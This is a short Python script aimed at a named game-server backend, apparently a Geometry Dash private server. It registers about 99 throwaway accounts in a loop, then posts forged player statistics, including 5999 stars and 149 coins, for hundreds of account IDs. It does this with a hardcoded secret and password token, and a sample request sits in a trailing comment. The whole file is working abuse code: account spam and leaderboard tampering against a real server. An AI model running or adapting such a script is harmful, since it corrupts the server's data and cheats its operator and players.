import requests

uri = "http://www.database-layout.online/updateGJUserScore22.php"
uri2 = "http://www.database-layout.online/accounts/registerGJAccount.php"

h = {
    "Host": "www.database-layout.online",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
}

for u in range(1, 100):
    d = "userName=Zolo"+str(u)+"&password=bruhmoment&email=bruh@bruh.com&secret=Wmfv3899gc9"
    r = requests.post(uri2, headers=h, data=d)

    if r.text == "1":
        print("Account created successfully!")
    else:
      print("Acc error")

s = 0
for i in range(192, 995):
    s = s + 1
    d = "gameVersion=21&binaryVersion=34&gdw=0&accountID="+str(i)+"&gjp=UUVAWltcWlBcQg==&userName=Zolo"+str(s)+"&stars=5999&demons=0&diamonds=0&icon=6&color1=12&color2=3&iconType=0&coins=149&userCoins=1&special=0&gameVersion=21&secret=Wmfd2893gb7&accIcon=10&accShip=33&accBall=11&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1&seed=XBRqIp0pTq&seed2=CAVRBAcJUFMDBQABU1JXAA1XBVcJAgMOBQ0HUQAFXVQEVlBcVANVUg=="
    r = requests.post(uri, headers=h, data=d)

    if r.text == "1":
        print("Stats gain fail")
    else:
        print(str(i) +"Stats gained!")


"""         gameVersion=21&binaryVersion=34&gdw=0&accountID=92&gjp=AAUFCw8H&userName=Skultz&stars=0&demons=0&diamonds=0&icon=1&color1=0&color2=3&iconType=0&coins=0&userCoins=0&special=0&gameVersion=21&secret=Wmfd2893gb7&accIcon=1&accShip=1&accBall=1&accBird=1&accDart=1&accRobot=1&accGlow=0&accSpider=1&accExplosion=1&seed=v13YCp38GC&seed2=DAJWBgVcBwpRAg4BClYDCAMCAQUJVgZUBQ1RAwJQCgxXAgUJBlFVUg== """
